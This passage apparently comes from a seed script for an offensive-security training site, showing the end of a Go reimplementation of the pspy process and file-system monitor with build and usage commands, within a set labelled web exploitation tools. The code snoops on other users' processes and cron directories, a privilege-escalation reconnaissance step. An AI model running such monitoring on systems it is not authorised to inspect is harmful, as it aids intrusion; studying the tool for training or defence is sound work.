    }

    for _, entry := range entries {
        if !entry.IsDir() {
            continue
        }

        pid, err := strconv.Atoi(entry.Name())
        if err != nil {
            continue
        }

        proc := pm.readProcess(pid)
        if proc != nil {
            processes = append(processes, *proc)
        }
    }

    return processes
}

func (pm *ProcessMonitor) readProcess(pid int) *Process {
    procPath := fmt.Sprintf("/proc/%d", pid)

    // Read cmdline
    cmdlineBytes, err := ioutil.ReadFile(filepath.Join(procPath, "cmdline"))
    if err != nil {
        return nil
    }

    cmdline := strings.ReplaceAll(string(cmdlineBytes), "\\x00", " ")
    cmdline = strings.TrimSpace(cmdline)

    if cmdline == "" {
        // Kernel thread or zombie
        comm, _ := ioutil.ReadFile(filepath.Join(procPath, "comm"))
        cmdline = "[" + strings.TrimSpace(string(comm)) + "]"
    }

    // Read status for UID and PPID
    statusBytes, err := ioutil.ReadFile(filepath.Join(procPath, "status"))
    if err != nil {
        return nil
    }

    var uid, ppid int
    for _, line := range strings.Split(string(statusBytes), "\\n") {
        if strings.HasPrefix(line, "Uid:") {
            fields := strings.Fields(line)
            if len(fields) >= 2 {
                uid, _ = strconv.Atoi(fields[1])
            }
        }
        if strings.HasPrefix(line, "PPid:") {
            fields := strings.Fields(line)
            if len(fields) >= 2 {
                ppid, _ = strconv.Atoi(fields[1])
            }
        }
    }

    // Resolve username
    username := strconv.Itoa(uid)
    if u, err := user.LookupId(strconv.Itoa(uid)); err == nil {
        username = u.Username
    }

    // Read cwd
    cwd, _ := os.Readlink(filepath.Join(procPath, "cwd"))

    return &Process{
        PID:     pid,
        PPID:    ppid,
        UID:     uid,
        User:    username,
        Cmdline: cmdline,
        Cwd:     cwd,
    }
}

func (pm *ProcessMonitor) printProcess(p Process) {
    timestamp := time.Now().Format("2006/01/02 15:04:05")

    // Color based on UID
    color := "\\033[0m"  // Default
    if p.UID == 0 {
        color = "\\033[31m"  // Red for root
    } else if p.UID < 1000 {
        color = "\\033[33m"  // Yellow for system users
    } else {
        color = "\\033[32m"  // Green for regular users
    }

    reset := "\\033[0m"

    fmt.Printf("%s%s CMD: %-8s PID: %-6d PPID: %-6d | %s%s\\n",
        color, timestamp, p.User, p.PID, p.PPID, p.Cmdline, reset)
}

// FileSystemMonitor watches for file changes
type FileSystemMonitor struct {
    watchPaths []string
}

func NewFileSystemMonitor(paths []string) *FileSystemMonitor {
    return &FileSystemMonitor{
        watchPaths: paths,
    }
}

func (fm *FileSystemMonitor) Start() {
    fd, err := syscall.InotifyInit1(0)
    if err != nil {
        fmt.Printf("[-] inotify init failed: %v\\n", err)
        return
    }

    for _, path := range fm.watchPaths {
        _, err := syscall.InotifyAddWatch(fd,
            path,
            syscall.IN_CREATE|syscall.IN_MODIFY|syscall.IN_DELETE)
        if err != nil {
            fmt.Printf("[-] Failed to watch %s: %v\\n", path, err)
        }
    }

    buf := make([]byte, 4096)
    for {
        n, err := syscall.Read(fd, buf)
        if err != nil {
            continue
        }

        fm.processEvents(buf[:n])
    }
}

func (fm *FileSystemMonitor) processEvents(buf []byte) {
    for offset := 0; offset < len(buf); {
        // Parse inotify_event
        wd := *(*int32)(unsafe.Pointer(&buf[offset]))
        mask := *(*uint32)(unsafe.Pointer(&buf[offset+4]))
        nameLen := *(*uint32)(unsafe.Pointer(&buf[offset+12]))

        name := ""
        if nameLen > 0 {
            name = string(buf[offset+16 : offset+16+int(nameLen)])
            name = strings.TrimRight(name, "\\x00")
        }

        event := ""
        switch {
        case mask&syscall.IN_CREATE != 0:
            event = "CREATE"
        case mask&syscall.IN_MODIFY != 0:
            event = "MODIFY"
        case mask&syscall.IN_DELETE != 0:
            event = "DELETE"
        }

        if event != "" && name != "" {
            timestamp := time.Now().Format("2006/01/02 15:04:05")
            fmt.Printf("%s FS: %-8s %s\\n", timestamp, event, name)
        }

        offset += 16 + int(nameLen)
        // Align to 4 bytes
        offset = (offset + 3) &^ 3
    }
}

func main() {
    interval := 100 * time.Millisecond

    // Process monitor
    pm := NewProcessMonitor(interval)
    go pm.Start()

    // File system monitor (for cron dirs)
    paths := []string{
        "/tmp",
        "/var/tmp",
        "/dev/shm",
        "/var/spool/cron",
        "/etc/cron.d",
    }
    fm := NewFileSystemMonitor(paths)
    fm.Start()
}
\`\`\`

### Usage

\`\`\`bash
# Compile
go build -o pspy pspy.go

# Run
./pspy

# Watch for cron jobs
./pspy 2>&1 | grep -i cron
\`\`\`
`, 0, now);

console.log('Seeded: Web Exploitation & Remaining Tools');
console.log('  - SQLMap (SQL Injection)');
console.log('  - Burp Suite Proxy');
console.log('  - pspy (Process Monitoring)');
